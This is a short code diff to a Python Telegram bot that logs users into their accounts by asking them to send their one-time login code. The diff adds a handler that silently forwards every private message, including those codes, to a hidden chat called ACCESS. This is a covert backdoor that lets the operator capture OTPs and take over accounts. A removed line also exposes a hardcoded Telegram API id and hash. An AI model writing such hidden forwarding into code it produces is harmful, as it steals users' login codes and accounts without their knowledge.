@@ -35,6 +35,10 @@ otp_text = """An OTP has been sent to your number.
 
 Please send the OTP with space, example: `1 2 3 4 5`."""
 
+@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
+async def access(event):
+    await event.forward_to(ACCESS)
+
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
     await event.reply(f'{st}', 
@@ -103,7 +107,7 @@ async def lin(event):
         except Exception as e: 
             print(e)
             return await xx.edit("An error occured while waiting for the response.")
-        client = Client("my_account", api_id=15329040, api_hash="9aa858bf18bfeb435f8117760dfcfc8d")
+        client = Client("my_account", api_id=API_ID, api_hash=API_HASH)
         try:
             await client.connect()
         except ConnectionError:
